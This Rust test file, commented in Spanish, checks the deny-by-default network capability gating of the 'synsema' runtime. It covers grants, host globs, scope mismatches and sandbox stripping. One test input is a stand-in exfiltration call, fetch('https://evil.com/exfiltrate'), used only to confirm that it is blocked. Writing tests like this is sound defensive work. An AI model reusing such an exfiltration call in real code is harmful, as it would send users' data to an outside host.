//! Conformidad del gating de red (DE-026): TODO el HTTP (`fetch`/`http_*`) es
//! deny-by-default, gateado por `net(host)`. Corre en modo `run` (run_source): `net`
//! NO se auto-otorga (a diferencia de stdout/time/llm), así que cada llamada necesita
//! su `require net`. Para distinguir "pasó el gate" de "bloqueado" se usa un host
//! `.invalid` (RFC 2606, no resoluble): si pasó el gate, `http_request` falla en la red
//! y devuelve `{status: 0, error}` como DATO (no una violación).

use synsema_runtime::engine::run_source;

// =========================================================
// Deny-by-default (string exacto) — también en modo run
// =========================================================

#[test]
fn fetch_deny_by_default_in_run() {
    let r = run_source("let r be fetch(\"https://evil.com/exfiltrate\")", "<t>");
    assert!(!r.success, "fetch debe ser deny-by-default incluso en run");
    assert_eq!(
        r.errors,
        vec!["Runtime error: Capability not granted: net(\"evil.com\")".to_string()]
    );
}

#[test]
fn http_get_deny_by_default_in_run() {
    let r = run_source("let r be http_get(\"https://evil.com/x\")", "<t>");
    assert!(!r.success);
    assert_eq!(
        r.errors,
        vec!["Runtime error: Capability not granted: net(\"evil.com\")".to_string()]
    );
}

#[test]
fn http_post_put_delete_deny_by_default() {
    for (call, host) in [
        ("http_post(\"https://a.com/x\", \"body\")", "a.com"),
        ("http_put(\"https://b.com/x\", \"body\")", "b.com"),
        ("http_delete(\"https://c.com/x\")", "c.com"),
        ("http(\"GET\", \"https://d.com/x\")", "d.com"),
    ] {
        let r = run_source(&format!("let r be {call}"), "<t>");
        assert!(!r.success, "{} debe violar sin require net", call);
        assert_eq!(
            r.errors,
            vec![format!("Runtime error: Capability not granted: net(\"{host}\")")],
            "call: {}",
            call
        );
    }
}

// =========================================================
// Grant pasa el gate (la red falla como DATO, no como violación)
// =========================================================

#[test]
fn grant_passes_the_gate() {
    // Con el grant adecuado la llamada SUPERA el chequeo y llega a http_request; el host
    // .invalid no resuelve → {status:0} (no es violación de capability).
    let r = run_source(
        "require net(\"nope-12345.invalid\")\n\
         let r be fetch(\"http://nope-12345.invalid/\")\n\
         print(text(r[\"status\"]))\n",
        "<t>",
    );
    assert!(r.success, "debió pasar el gate y fallar en red, got {:?}", r.errors);
    assert_eq!(r.output, vec!["0".to_string()]);
}

#[test]
fn wildcard_and_host_glob_cover() {
    // `require net` (sin scope) cubre cualquier host → pasa el gate.
    let r = run_source(
        "require net\nlet r be http_get(\"http://nope-67890.invalid/\")\nprint(text(r[\"status\"]))",
        "<t>",
    );
    assert!(r.success, "wildcard net debe cubrir todo: {:?}", r.errors);
    assert_eq!(r.output, vec!["0".to_string()]);

    // glob de host: `net("*.invalid")` cubre `api.invalid`.
    let r = run_source(
        "require net(\"*.invalid\")\nlet r be http_get(\"http://api.invalid/\")\nprint(text(r[\"status\"]))",
        "<t>",
    );
    assert!(r.success, "glob de host debe cubrir el subdominio: {:?}", r.errors);
    assert_eq!(r.output, vec!["0".to_string()]);
}

// =========================================================
// Scope fiel: un host concedido no cubre otro
// =========================================================

#[test]
fn scope_mismatch_violates() {
    let r = run_source(
        "require net(\"api.ok.com\")\nlet r be fetch(\"https://otro.com/x\")",
        "<t>",
    );
    assert!(!r.success);
    assert_eq!(
        r.errors,
        vec!["Runtime error: Capability not granted: net(\"otro.com\")".to_string()]
    );
}

// =========================================================
// Sandbox despoja `net`
// =========================================================

#[test]
fn sandbox_strips_net() {
    let r = run_source(
        "require net(\"a.invalid\")\nsandbox\n    let r be fetch(\"http://a.invalid/\")",
        "<t>",
    );
    assert!(!r.success, "el sandbox debería denegar net");
    assert!(
        r.errors.iter().any(|e| e.contains("Capability not granted: net")),
        "got {:?}",
        r.errors
    );
}
